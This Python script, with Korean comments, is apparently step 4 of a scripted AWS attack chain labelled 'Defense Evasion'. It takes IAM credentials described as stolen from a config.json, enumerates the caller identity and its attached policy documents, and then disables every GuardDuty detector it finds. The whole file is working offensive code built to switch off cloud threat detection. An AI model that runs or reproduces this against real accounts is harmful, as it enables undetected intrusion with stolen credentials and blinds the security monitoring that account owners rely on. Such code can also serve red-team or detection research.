"""
Step 4 — Defense Evasion (탐지 회피)
config.json 에서 획득한 IAM User 자격증명(stolen-iam 프로필)으로
GuardDuty 탐지기 비활성화.

단독 실행:
    python step4_defense_evasion.py \\
        --iam-access-key AKIA... --iam-secret-key xxxx
"""

import argparse
import json
import logging
import sys
import os

import boto3
from botocore.exceptions import ClientError

sys.path.insert(0, __file__.rsplit("\\", 1)[0] if "\\" in __file__ else ".")
import config

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
log = logging.getLogger(__name__)


def _discover_iam_user(session: boto3.Session) -> dict:
    result = {"caller_identity": {}, "attached_policies": [], "policy_documents": {}}

    # 1. 이 자격증명이 누구 건지 확인
    try:
        sts = session.client("sts")
        identity = sts.get_caller_identity()
        result["caller_identity"] = {
            "UserId":  identity.get("UserId"),
            "Account": identity.get("Account"),
            "Arn":     identity.get("Arn"),
        }
        log.info("  [IAM-User] CallerIdentity: %s", identity.get("Arn"))
    except ClientError as e:
        log.warning("  get_caller_identity 실패: %s", e)

    # 2. 붙어있는 관리형 정책 목록 확인
    iam = session.client("iam")
    try:
        resp = iam.list_attached_user_policies(UserName=config.IAM_USER_NAME)
        for p in resp.get("AttachedPolicies", []):
            result["attached_policies"].append({"name": p["PolicyName"], "arn": p["PolicyArn"]})
            log.info("  [IAM-User] 관리형 정책: %s (%s)", p["PolicyName"], p["PolicyArn"])
    except ClientError as e:
        log.warning("  list_attached_user_policies 실패: %s", e)

    # 3. 각 정책의 기본 버전 확인 후 실제 내용 조회
    for policy in result["attached_policies"]:
        arn = policy["arn"]
        try:
            ver_id = iam.get_policy(PolicyArn=arn)["Policy"]["DefaultVersionId"]
            doc = iam.get_policy_version(PolicyArn=arn, VersionId=ver_id)["PolicyVersion"]["Document"]
            result["policy_documents"][policy["name"]] = {"version": ver_id, "document": doc}
            log.info("  [IAM-User] 정책 내용 확인: %s (%s)", policy["name"], ver_id)
        except ClientError as e:
            log.warning("  정책 내용 조회 실패 (%s): %s", arn, e)

    return result


def _disable_guardduty(session: boto3.Session) -> dict:
    gd = session.client("guardduty", region_name=config.REGION)
    result = {"detectors_disabled": [], "errors": []}

    try:
        resp = gd.list_detectors()
        detector_ids = resp.get("DetectorIds", [])
        if not detector_ids:
            log.warning("  [GuardDuty] 탐지기를 찾을 수 없음")
            return result

        for det_id in detector_ids:
            log.info("  [GuardDuty] 탐지기 발견: %s", det_id)
            try:
                gd.update_detector(DetectorId=det_id, Enable=False)
                log.info("  [+] 탐지기 비활성화 성공: %s", det_id)
                result["detectors_disabled"].append(det_id)
            except ClientError as e:
                log.error("  [-] 탐지기 비활성화 실패 (%s): %s", det_id, e)
                result["errors"].append(str(e))

    except ClientError as e:
        log.error("  [-] list_detectors 실패: %s", e)
        result["errors"].append(str(e))

    return result


def run(iam_access_key: str, iam_secret_key: str) -> dict:
    """
    Returns: {
        "guardduty": {"detectors_disabled": [...], "errors": [...]},
    }
    """
    log.info("=" * 60)
    log.info("Step 4: Defense Evasion (GuardDuty 비활성화)")
    log.info("=" * 60)

    session = boto3.Session(
        aws_access_key_id=iam_access_key,
        aws_secret_access_key=iam_secret_key,
        region_name=config.REGION,
    )

    iam_user_info = _discover_iam_user(session)
    gd_result = _disable_guardduty(session)

    result = {"iam_user_discovery": iam_user_info, "guardduty": gd_result}
    log.info("[Step 4 완료] GuardDuty 비활성화: %s", gd_result["detectors_disabled"])
    return result


if __name__ == "__main__":
    # .env 로드 (os.environ에 없는 키만)
    _env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
    if os.path.exists(_env_path):
        with open(_env_path) as _f:
            for _line in _f:
                _line = _line.strip()
                if not _line or _line.startswith("#") or "=" not in _line:
                    continue
                _k, _, _v = _line.partition("=")
                if _k.strip() not in os.environ:
                    os.environ[_k.strip()] = _v.strip()

    parser = argparse.ArgumentParser(description="Step 4: GuardDuty 비활성화")
    parser.add_argument("--iam-access-key", default=None)
    parser.add_argument("--iam-secret-key", default=None)
    args = parser.parse_args()

    iam_key    = args.iam_access_key or os.environ.get("IAM_ACCESS_KEY_ID")
    iam_secret = args.iam_secret_key or os.environ.get("IAM_SECRET_ACCESS_KEY")
    if not (iam_key and iam_secret):
        print("[ERROR] --iam-access-key/--iam-secret-key 또는 .env의 IAM_ACCESS_KEY_ID/IAM_SECRET_ACCESS_KEY 필요")
        sys.exit(1)

    result = run(iam_key, iam_secret)
    print("\n[결과]")
    print(json.dumps(result, indent=2, ensure_ascii=False))
